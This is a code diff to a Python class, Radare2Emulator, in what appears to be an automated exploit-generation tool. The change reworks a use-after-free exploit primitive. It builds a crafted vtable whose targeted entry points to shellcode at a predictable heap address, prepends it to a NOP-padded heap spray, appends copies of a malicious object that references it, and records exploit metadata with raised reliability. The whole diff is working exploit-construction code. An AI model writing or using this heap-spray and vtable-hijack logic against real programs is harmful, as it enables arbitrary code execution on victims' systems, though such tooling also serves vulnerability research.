@@ -986,29 +986,43 @@ class Radare2Emulator:
         if has_vtable:
             # Calculate addresses for crafted vtable and shellcode
             if self.bits == 64:
-                # Predictable heap address on x64
-                heap_base = 0x555555560000  # Typical heap base
+                ptr_size = 8
+                pack_fmt = "<Q"
+                heap_base = 0x555555560000
                 shellcode_addr = heap_base + 0x1000
-
-                # Build crafted vtable pointing to shellcode
                 crafted_vtable_addr = heap_base + 0x2000
-                crafted_vtable = struct.pack("<Q", shellcode_addr) * 8  # 8 function pointers
 
-                # Build malicious object with vtable pointer
-                malicious_object = struct.pack("<Q", crafted_vtable_addr)  # vtable pointer
-                malicious_object += b"\x00" * 8  # padding/member
-                malicious_object += struct.pack("<Q", 0x1337)  # magic value
+                vtable_entry_count = max(8, (vtable_offset // ptr_size) + 1)
+                crafted_vtable = b""
+                for i in range(vtable_entry_count):
+                    entry_offset = i * ptr_size
+                    if entry_offset == vtable_offset:
+                        crafted_vtable += struct.pack(pack_fmt, shellcode_addr)
+                    else:
+                        crafted_vtable += struct.pack(pack_fmt, 0xDEADBEEFDEADBEEF)
+
+                malicious_object = struct.pack(pack_fmt, crafted_vtable_addr)
+                malicious_object += b"\x00" * ptr_size
+                malicious_object += struct.pack(pack_fmt, 0x1337)
             else:
-                # 32-bit addresses
+                ptr_size = 4
+                pack_fmt = "<I"
                 heap_base = 0x08050000
                 shellcode_addr = heap_base + 0x1000
-
                 crafted_vtable_addr = heap_base + 0x2000
-                crafted_vtable = struct.pack("<I", shellcode_addr) * 8
 
-                malicious_object = struct.pack("<I", crafted_vtable_addr)
-                malicious_object += b"\x00" * 4
-                malicious_object += struct.pack("<I", 0x1337)
+                vtable_entry_count = max(8, (vtable_offset // ptr_size) + 1)
+                crafted_vtable = b""
+                for i in range(vtable_entry_count):
+                    entry_offset = i * ptr_size
+                    if entry_offset == vtable_offset:
+                        crafted_vtable += struct.pack(pack_fmt, shellcode_addr)
+                    else:
+                        crafted_vtable += struct.pack(pack_fmt, 0xDEADBEEF)
+
+                malicious_object = struct.pack(pack_fmt, crafted_vtable_addr)
+                malicious_object += b"\x00" * ptr_size
+                malicious_object += struct.pack(pack_fmt, 0x1337)
         elif self.bits == 64:
             heap_base = 0x555555560000
             shellcode_addr = heap_base + 0x1000
@@ -1030,13 +1044,32 @@ class Radare2Emulator:
 
         # Build complete heap spray
         spray_data = b""
+
+        # Prepend crafted_vtable to heap spray data so malicious object references valid vtable
+        if has_vtable and "crafted_vtable" in locals():
+            vtable_padding_size = 0x2000 - 0x1000
+            if vtable_padding_size > 0:
+                spray_data += b"\x90" * vtable_padding_size
+            spray_data += crafted_vtable
+            spray_data += b"\x90" * (0x100 - (len(crafted_vtable) % 0x100)) if len(crafted_vtable) % 0x100 else b""
+
         for i in range(spray_count):
-            # Alternate patterns for better success rate
             pattern = spray_patterns[i % len(spray_patterns)]
             spray_data += pattern
 
-        # Add malicious objects at predictable locations
-        trigger_input = spray_data + (malicious_object * 16)  # Multiple copies for reliability
+        trigger_input = spray_data + (malicious_object * 16)
+
+        exploit_metadata: dict[str, int | str | bool] = {
+            "spray_size": spray_count * 0x100,
+            "malicious_object_size": len(malicious_object),
+            "object_alignment": alignment,
+            "heap_implementation": heap_impl if "heap_impl" in locals() else "unknown",
+            "has_vtable": has_vtable,
+            "vtable_offset": vtable_offset,
+        }
+        if has_vtable and "crafted_vtable" in locals():
+            exploit_metadata["crafted_vtable_size"] = len(crafted_vtable)
+            exploit_metadata["crafted_vtable_included"] = True
 
         return ExploitPrimitive(
             type=ExploitType.USE_AFTER_FREE,
@@ -1044,13 +1077,8 @@ class Radare2Emulator:
             trigger_input=trigger_input,
             payload=malicious_object,
             constraints=["heap operations", "freed object reuse"],
-            reliability=0.5,
-            metadata={
-                "spray_size": spray_count * 0x100,
-                "malicious_object_size": len(malicious_object),
-                "object_alignment": alignment,
-                "heap_implementation": heap_impl if "heap_impl" in locals() else "unknown",
-            },
+            reliability=0.6 if has_vtable else 0.5,
+            metadata=exploit_metadata,
         )
 
     def _detect_heap_implementation(self) -> str:
